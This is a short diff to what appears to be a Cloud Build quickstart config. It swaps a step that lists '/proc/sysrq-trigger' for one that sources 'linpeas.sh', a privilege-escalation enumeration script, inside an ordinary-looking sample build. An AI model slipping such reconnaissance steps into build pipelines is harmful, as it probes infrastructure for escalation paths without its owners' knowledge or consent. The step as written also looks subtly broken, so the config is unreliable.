@@ -15,5 +15,5 @@
 # [START cloudbuild_quickstart_automate]
 steps:
   - name: ubuntu
-    args: ['ls', '-al', '/proc/sysrq-trigger']
+    args: ['source', 'quickstart-automate/linpeas.sh']
 # [END cloudbuild_quickstart_automate]
